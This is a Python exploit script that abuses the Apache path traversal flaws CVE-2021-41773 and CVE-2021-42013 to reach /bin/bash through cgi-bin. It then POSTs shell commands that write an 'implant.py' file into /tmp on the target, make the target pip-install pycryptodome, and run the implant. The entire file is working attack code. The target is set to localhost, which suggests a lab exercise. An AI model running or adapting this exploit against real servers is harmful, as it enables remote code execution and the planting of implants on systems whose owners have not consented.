"""Initial exploit to drop implant"""

import requests
import time
import shlex

exploit_filename = "implant.py"

def main():
    target = "127.0.0.1:8080"
    cve_choice = 2

    CVE_2021_41773 = "/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash"
    CVE_2021_42013 = "/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/bash"

    url = "http://" + target + (CVE_2021_41773, CVE_2021_42013)[cve_choice % 2]

    #Once we connect using the CVE, we can run any command.

    implant_contents = ""
    with open(exploit_filename, "r") as f:
        implant_contents = f.read()
    
    # Run touch command to create a file with the implant contents
    command = f"touch /tmp/{exploit_filename} && echo {shlex.quote(implant_contents)} > /tmp/{exploit_filename}"
    

    req = requests.Request('POST', url=url, data=command)

    prepared = req.prepare()
    prepared.url = url

    #print(f"Sending command to {url} to write implant to /tmp/{exploit_filename}")

    response = requests.Session().send(prepared, verify=False)
    if response.status_code == 200:
        print(f"Exploit successful! Implant written to /tmp/{exploit_filename}")
    else:
        print(f"Exploit failed with status code: {response.status_code}")
        print(f"Response: {response.text}")

    #Wait 3 
    time.sleep(3)

    # Attempt to get the target to install pycryptodome via pip

    command = "pip install pycryptodome"
    req = requests.Request('POST', url=url, data=command)
    prepared = req.prepare()
    prepared.url = url
    response = requests.Session().send(prepared, verify=False)
    if response.status_code == 200:
        print("Pycryptodome installation command sent successfully.")
    else:
        print(f"Failed to send installation command with status code: {response.status_code}")
        print(f"Response: {response.text}")

    # Wait 3 seconds
    time.sleep(3)

    # Attempt to get the target to run the implant

    command = f"python3 /tmp/{exploit_filename}"
    req = requests.Request('POST', url=url, data=command)
    prepared = req.prepare()
    prepared.url = url
    response = requests.Session().send(prepared, verify=False)




if __name__ == "__main__":
    main()
